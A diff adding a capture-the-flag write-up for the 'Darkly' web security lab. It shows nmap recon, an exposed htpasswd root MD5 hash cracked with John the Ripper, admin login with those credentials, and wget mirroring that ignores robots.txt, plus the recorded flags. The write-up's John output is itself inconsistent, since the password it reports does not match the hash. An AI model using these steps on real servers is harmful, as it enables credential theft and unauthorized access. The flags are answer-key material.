@@ -1,0 +1,81 @@
+With the use of nmap on the ip address, using the default scripts, we manage to get some information
+
+┌──(amuller㉿Laptop)-[~/Documents/Darkly]
+└─$ sudo nmap -sC -sV -O -p 80 10.18.191.94
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    nginx 1.4.6 (Ubuntu)
+|_http-title: BornToSec - Web Section
+|_http-server-header: nginx/1.4.6 (Ubuntu)
+| http-robots.txt: 2 disallowed entries 
+|_/whatever /.hidden
+
+Nmap identified a robots.txt file on the target web server, and this file contains two entries specifying paths or User-Agents that are disallowed for web crawlers. The robots.txt file is a standard used by websites to communicate with web crawlers and other automated agents, instructing them on which parts of the site should not be crawled or accessed.
+It's content is also specified: 
+
+    User-agent: *
+    Disallow: /whatever
+    Disallow: /.hidden
+
+The /whatever directory contains a single file named htpasswd:
+
+root:437394baff5aa33daa618be47b75cb49
+
+When i use john the ripper on this hash i get:
+
+┌──(amuller㉿Laptop)-[~/Documents/Darkly/vuln/Port scanning]
+└─$ john --format=raw-md5 hash -w /usr/share/wordlists/rockyou.txt 
+Warning: invalid UTF-8 seen reading /usr/share/wordlists/rockyou.txt
+Using default input encoding: UTF-8
+Loaded 52 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
+Warning: no OpenMP support for this hash type, consider --fork=8
+Proceeding with wordlist:/usr/share/john/password.lst
+Press 'q' or Ctrl-C to abort, almost any other key for status
+        emerald          (?)     
+1g 0:00:00:00 DONE (2023-11-21 19:00) 100.0g/s 354600p/s 354600c/s 18199KC/s !@#$%..sss
+Warning: passwords printed above might not be all those cracked
+Use the "--show --format=Raw-MD5" options to display all of the cracked passwords reliably
+Session completed. 
+
+Which is false, so i dont understand, the truth is qwerty123@
+
+┌──(amuller㉿Laptop)-[~/Documents/Darkly/vuln/Port scanning]
+└─$ openssl md5
+qwerty123@MD5(stdin)= 437394baff5aa33daa618be47b75cb49
+                                                                                                                                                                                               
+┌──(amuller㉿Laptop)-[~/Documents/Darkly/vuln/Port scanning]
+└─$ openssl md5
+emeraldMD5(stdin)= bd9059497b4af2bb913a8522747af2de
+
+Going then to the /admin directory, we get a login page, and we can use the credentials we found earlier to log in.
+
+flag:d19b4823e0d5600ceed56d5e896ef328d7a2b9e7ac7e80f4fcdb9b10bcb3e7ff
+
+
+
+
+The /.hidden directory is full of nested directories, that we are going to download and inspect
+It is a little tricky because of the robots.txt and the depth of directories, but after some crafting this gets us there:
+
+wget --no-clobber --convert-links --random-wait -r -p --level 4 -E -e robots=off -U mozilla http://10.18.191.94/.hidden
+
+We then can cat all the README to get the info:
+
+cat */*/*/README
+
+But it is unreadable, too much information, we have to filter a bit those phrases:
+   
+    Demande à ton voisin du dessous 
+    Tu veux de l'aide ? Moi aussi !  
+    Demande à ton voisin de gauche  
+    Non ce n'est toujours pas bon ...
+    Toujours pas tu vas craquer non ?
+
+
+With grep -v we can easily remove those, giving us the first flag
+
+┌──(amuller㉿Laptop)-[~/…/discovery/test/10.18.191.94/.hidden]
+└─$ cat */*/*/README | grep -v Demande | grep -v Toujours | grep -v Non | grep -v Tu
+Hey, here is your flag : d5eec3ec36cf80dce44a896f961c1831a05526ec215693c8f2c39543497d4466
+
+
